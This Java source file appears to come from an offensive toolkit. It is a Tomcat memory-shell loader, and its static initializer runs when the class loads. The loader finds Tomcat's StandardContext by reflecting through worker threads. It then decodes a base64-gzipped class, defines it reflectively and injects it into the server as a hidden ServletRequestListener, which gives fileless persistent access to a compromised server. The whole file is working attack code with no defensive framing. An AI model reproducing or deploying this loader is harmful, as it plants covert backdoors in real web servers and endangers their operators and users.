package com.ppp.middleware.loader;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.List;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 */
@Middleware(Middleware.Tomcat)
@MemShell(MemShell.Listener)
@JavaClassModifiable({JavaClassModifiable.CLASSNAME})
public class TomcatListenerThreadLoader {
    private static String gzipObject;
    private static String CLASSNAME;

    public TomcatListenerThreadLoader() {
    }

    static {
        try {
            // 获取 standardContext
            Object standardContext = getStandardContext();

            inject(standardContext);

        } catch (Throwable e) {

        }
    }


//    public static void inject(Object standardContext) throws Exception {
//    }

    /**
     * Tomcat Listener
     */
    public static void inject(Object standardContext) throws Exception {
        Object[] applicationEventListenersObjects = null;
        List applicationEventListeners;
        Object object = getObject();
        try {
            applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
            for (int i = 0; i < applicationEventListeners.size(); i++) {
                if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
                    return;
                }
            }
        } catch (Exception e) {

        }

        try {
            applicationEventListenersObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
            for (int i = 0; i < applicationEventListenersObjects.length; i++) {
                Object applicationEventListenersObject = applicationEventListenersObjects[i];
                if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {
                    Object h = getFieldValue(applicationEventListenersObject, "h");
                    Object h2 = getFieldValue(object, "h");
                    if (h.getClass().getName().contains(h2.getClass().getName())) {
                        return;
                    }
                } else {
                    if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
                        return;
                    }
                }
            }
        } catch (Exception e) {

        }

        if (applicationEventListenersObjects != null) {
            // 5 6
            Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];
            System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);
            newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = object;
            setFieldValue(standardContext, "applicationEventListenersObjects", newApplicationEventListenersObjects);
        } else {
            List applicationEventListenersList = (List) getFieldValue(standardContext, "applicationEventListenersList");
            applicationEventListenersList.add(object);

            // 7 8 9 10
//            invokeMethod(standardContext.getClass(), standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
        }
    }

    public static Object getStandardContext() throws Exception {
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
//        Thread[] threads = new Thread[Thread.currentThread().getThreadGroup().activeCount()];
        for (int i = 0; i < threads.length; i++) {
            Thread thread = threads[i];
            // Thread 筛选
            if (thread == null)
                continue;
            String threadName = thread.getName();
            if (!(
                    ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                            || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                            || (threadName.contains("http-") && threadName.contains("Acceptor"))
            ))
                continue;
            Object target = getFieldValue(thread, "target");
            Object this0 = getFieldValue(target, "this$0");
            Object handler = getFieldValue(this0, "handler");
            Object global = getFieldValue(handler, "global");
            java.util.List processors = (java.util.List) getFieldValue(global, "processors");

            for (int j = 0; j < processors.size(); j++) {
                Object processor = processors.get(j);
                Object req = getFieldValue(processor, "req");
                Object request = req.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(req, new Integer(1));

                Object standardContext;
                try {
                    Object servletContext = request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                    Object applicationContext = getFieldValue(servletContext, "context");
                    standardContext = getFieldValue(applicationContext, "context");
                } catch (NoSuchMethodException e) {
                    standardContext = getFieldValue(request, "context");
                }

                return standardContext;
            }
        }


        return null;
    }

    public static Object getObject() throws Exception {
        // 动态代理兼容 javax jakarta
        Class servletRequestListenerClass = null;
        try {
            servletRequestListenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
        } catch (Exception e) {
            try {
                servletRequestListenerClass = Class.forName("javax.servlet.ServletRequestListener");
            } catch (ClassNotFoundException ex) {

            }
        }

        byte[] bytes = decompress(gzipObject);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz;
        try {
            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        } catch (Exception e) {
            clazz = classLoader.loadClass(CLASSNAME);
        }
        Object javaObject = clazz.newInstance();
        Object object = Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(), new Class[]{servletRequestListenerClass}, (InvocationHandler) javaObject);

        return object;
    }


    // tools
    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }


}
